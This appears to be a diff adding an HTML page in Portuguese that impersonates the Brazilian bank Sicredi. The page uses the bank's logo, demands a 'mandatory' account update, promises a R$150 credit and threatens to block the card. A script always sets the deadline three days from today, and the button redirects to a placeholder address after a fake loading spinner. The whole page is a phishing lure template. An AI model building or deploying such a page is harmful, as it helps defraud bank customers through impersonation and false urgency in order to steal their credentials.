@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Atualização Sicredi</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f3f3f3;
+      margin: 0;
+      padding: 0;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .container {
+      max-width: 500px;
+      background: #fff;
+      padding: 25px 20px;
+      text-align: center;
+      box-shadow: 0 0 15px rgba(0,0,0,0.2);
+      border-radius: 8px;
+    }
+
+    .logo {
+      width: 60%;
+      max-width: 200px;
+      margin-bottom: 20px;
+    }
+
+    h2 {
+      color: #006437;
+      font-size: 20px;
+      margin-bottom: 15px;
+    }
+
+    .promo {
+      background-color: #e6ffe6;
+      color: #006437;
+      padding: 10px;
+      border-radius: 6px;
+      font-weight: bold;
+      margin: 15px 0;
+      font-size: 15px;
+    }
+
+    p {
+      font-size: 15px;
+      margin: 15px 0;
+      color: #333;
+    }
+
+    .btn-container {
+      position: relative;
+      display: inline-block;
+      width: 100%;
+      max-width: 300px;
+    }
+
+    .btn {
+      background-color: #006437;
+      color: white;
+      padding: 14px;
+      width: 100%;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      cursor: pointer;
+      position: relative;
+      z-index: 2;
+      overflow: hidden;
+    }
+
+    .btn:hover {
+      background-color: #004c2b;
+    }
+
+    .spinner {
+      border: 8px solid #f3f3f3;
+      border-top: 8px solid #00cc44;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 2s linear infinite;
+      margin: 0 auto;
+      display: none;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .aviso {
+      color: red;
+      font-weight: bold;
+      margin-top: 20px;
+      font-size: 14px;
+    }
+
+    @media screen and (max-width: 480px) {
+      .container {
+        margin: 20px 10px;
+        padding: 20px 15px;
+      }
+
+      .btn {
+        font-size: 15px;
+        padding: 12px;
+      }
+
+      .promo, p, .aviso {
+        font-size: 14px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <img src="https://marca.sicredi.com.br/media/brandplace/filer_public_thumbnails/filer_public/2024/09/20/back3.png__532x482_subsampling-2.webp" alt="Sicredi" class="logo">
+    
+    <h2>Atualização Obrigatória</h2>
+    
+    <div class="promo">
+      Realize sua atualização cadastral. E garanta seu Crédito de R$ 150,00 em até 01 hora em seu extrato.
+    </div>
+    
+    <p>Para continuar utilizando seu cartão de crédito com segurança, é necessário realizar uma atualização cadastral imediata.</p>
+    <p>Clique no botão abaixo para iniciar a verificação.</p>
+    
+    <div class="btn-container">
+      <button class="btn" id="atualizarBtn" onclick="iniciarAtualizacao()">Atualizar Agora</button>
+      <div class="spinner" id="spinner"></div>
+    </div>
+
+    <p class="aviso" id="dataLimite">Evite o bloqueio do cartão. Atualize até --/--/----</p>
+  </div>
+
+  <script>
+    // Data dinâmica +3 dias
+    const aviso = document.getElementById("dataLimite");
+    const hoje = new Date();
+    hoje.setDate(hoje.getDate() + 3); // Adiciona 3 dias à data atual
+    const dia = ("0" + hoje.getDate()).slice(-2);
+    const mes = ("0" + (hoje.getMonth() + 1)).slice(-2);
+    const ano = hoje.getFullYear();
+    aviso.textContent = `Evite o bloqueio do cartão. Atualize até ${dia}/${mes}/${ano}.`;
+
+    // Função para iniciar a atualização
+    function iniciarAtualizacao() {
+      // Esconde o botão
+      document.getElementById("atualizarBtn").style.display = "none";
+      
+      // Exibe a bolinha de carregamento
+      document.getElementById("spinner").style.display = "block";
+      
+      // Redireciona após 2 segundos
+      setTimeout(() => {
+        window.location.href = "https://www.seusite.com";
+      }, 2000);
+    }
+  </script>
+</body>
+</html>
